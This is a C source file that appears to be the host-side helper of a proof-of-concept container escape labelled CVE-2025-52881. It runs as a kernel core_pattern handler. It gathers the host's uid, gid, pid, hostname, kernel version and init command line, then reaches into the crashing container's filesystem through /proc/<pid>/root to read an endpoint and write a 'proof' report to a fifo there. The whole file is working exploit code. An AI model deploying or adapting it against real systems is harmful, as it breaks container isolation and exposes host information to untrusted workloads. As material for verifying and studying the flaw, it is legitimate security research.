#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define LINE_BUF_SIZE 512
#define BODY_BUF_SIZE 4096

static int copy_numeric_pid(char *dst, size_t dstlen, const char *src);

static void write_all(int fd, const char *s) {
  size_t left = strlen(s);
  while (left > 0) {
    ssize_t n = write(fd, s, left);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return;
    }
    s += n;
    left -= (size_t)n;
  }
}

static int write_bytes(int fd, const char *s, size_t len) {
  size_t left = len;
  while (left > 0) {
    ssize_t n = write(fd, s, left);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return -1;
    }
    s += n;
    left -= (size_t)n;
  }
  return 0;
}

static int read_first_line(const char *path, char *buf, size_t buflen) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  ssize_t n = read(fd, buf, buflen - 1);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  buf[n] = '\0';
  char *nl = strpbrk(buf, "\r\n");
  if (nl != NULL) {
    *nl = '\0';
  }
  return buf[0] == '\0' ? -1 : 0;
}

static int format_callback_body(char *body, size_t body_size, int argc,
                                char **argv) {
  time_t now = time(NULL);
  char ts[64];
  struct tm *tm = gmtime(&now);
  if (tm != NULL) {
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%SZ", tm);
  } else {
    snprintf(ts, sizeof(ts), "(time-unavailable)");
  }

  char hostname[256] = "(unknown)";
  gethostname(hostname, sizeof(hostname) - 1);

  char kernel[LINE_BUF_SIZE] = "(unknown)";
  read_first_line("/proc/version", kernel, sizeof(kernel));

  char init_cmdline[LINE_BUF_SIZE] = "(unreadable)";
  int cfd = open("/proc/1/cmdline", O_RDONLY | O_CLOEXEC);
  if (cfd >= 0) {
    ssize_t n = read(cfd, init_cmdline, sizeof(init_cmdline) - 1);
    close(cfd);
    if (n > 0) {
      init_cmdline[n] = '\0';
      for (ssize_t i = 0; i < n - 1; i++) {
        if (init_cmdline[i] == '\0') {
          init_cmdline[i] = ' ';
        }
      }
    }
  }

  int body_len = snprintf(body, body_size,
                          "CVE-2025-52881 escape proof\n"
                          "source=core_pattern_callback\n"
                          "timestamp=%s\n"
                          "uid=%ld gid=%ld pid=%ld\n"
                          "argc=%d argv1=%s\n"
                          "hostname=%s\n"
                          "kernel=%s\n"
                          "init_cmdline=%s\n"
                          "proof=host_callback_from_core_pattern_helper\n",
                          ts, (long)getuid(), (long)getgid(), (long)getpid(),
                          argc, argc > 1 && argv[1] != NULL ? argv[1] : "",
                          hostname, kernel, init_cmdline);
  if (body_len <= 0 || (size_t)body_len >= body_size) {
    return -1;
  }
  return body_len;
}

static int send_callback(const char *endpoint, int argc, char **argv) {
  char body[BODY_BUF_SIZE];
  int body_len = format_callback_body(body, sizeof(body), argc, argv);
  if (body_len <= 0) {
    return -1;
  }

  if (strncmp(endpoint, "fifo://", 7) == 0) {
    const char *fifo = endpoint + 7;
    char pid[32];
    char path[4096];

    if (fifo[0] != '/') {
      return -1;
    }
    if (argc > 1 && copy_numeric_pid(pid, sizeof(pid), argv[1]) == 0) {
      snprintf(path, sizeof(path), "/proc/%s/root%s", pid, fifo);
    } else {
      snprintf(path, sizeof(path), "%s", fifo);
    }

    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) {
      return -1;
    }
    int ok = write_bytes(fd, body, (size_t)body_len);
    close(fd);
    return ok;
  }

  return -1;
}

static int copy_numeric_pid(char *dst, size_t dstlen, const char *src) {
  size_t len = 0;

  if (src == NULL || src[0] == '\0') {
    return -1;
  }
  while (src[len] != '\0') {
    if (src[len] < '0' || src[len] > '9') {
      return -1;
    }
    len++;
  }
  if (len == 0 || len >= dstlen) {
    return -1;
  }
  memcpy(dst, src, len);
  dst[len] = '\0';
  return 0;
}

static int read_endpoint(int argc, char **argv, char *endpoint,
                         size_t endpoint_len) {
  char pid[32];
  char path[128];

  if (argc > 1 && copy_numeric_pid(pid, sizeof(pid), argv[1]) == 0) {
    snprintf(path, sizeof(path), "/proc/%s/root/tmp/endpoint", pid);
    if (read_first_line(path, endpoint, endpoint_len) == 0) {
      return 0;
    }
  }

  if (read_first_line("/proc/1/root/tmp/endpoint", endpoint, endpoint_len) == 0) {
    return 0;
  }
  return read_first_line("/tmp/endpoint", endpoint, endpoint_len);
}

int main(int argc, char **argv) {
  write_all(STDERR_FILENO, "CVE-2025-52881 escape-helper executed\n");

  char endpoint[512];
  if (read_endpoint(argc, argv, endpoint, sizeof(endpoint)) == 0) {
    if (endpoint[0] != '\0') {
      return send_callback(endpoint, argc, argv) == 0 ? 0 : 1;
    }
  }

  return 1;
}
